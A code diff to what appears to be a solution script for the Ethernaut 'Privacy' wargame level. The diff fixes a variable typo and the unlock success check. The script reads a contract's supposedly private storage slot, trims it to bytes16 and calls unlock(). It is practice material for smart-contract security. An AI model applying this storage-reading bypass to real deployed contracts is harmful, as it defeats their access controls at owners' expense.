@@ -30,7 +30,6 @@ const attackPrivacy = async () => {
         },
     ];
     const contract = await ethers.getContractAt(ABI, privacyAddress);
-    console.log("log");
     let locked = await contract.locked();
     console.log(`Locked?: ${locked}`);
     console.log("Reading storage for data to unlock...");
@@ -39,16 +38,16 @@ const attackPrivacy = async () => {
     const data = await provider.getStorageAt(privacyAddress, 5);
     console.log(data);
     console.log("Converting to bytes16 to meet the requirement...");
-    const cleaData = data.slice(0, 34);
-    console.log(`data is: ${cleaData}`);
+    const cleanData = data.slice(0, 34);
+    console.log(`data is: ${cleanData}`);
     console.log("Inputting data to unlock...");
-    const unlock = await contract.unlock(cleaData);
+    const unlock = await contract.unlock(cleanData);
     const Receipt = await unlock.wait();
     console.log(Receipt);
     locked = await contract.locked();
     console.log(`Locked?: ${locked}`);
-    if (locked) {
-        console.log("Congrats, You may submit to ethernaut...");
+    if (!locked) {
+        console.log("Congrats! Level Passed, You may submit to ethernaut");
     } else {
         console.log("Sorry still unlocked, please review code above...");
     }
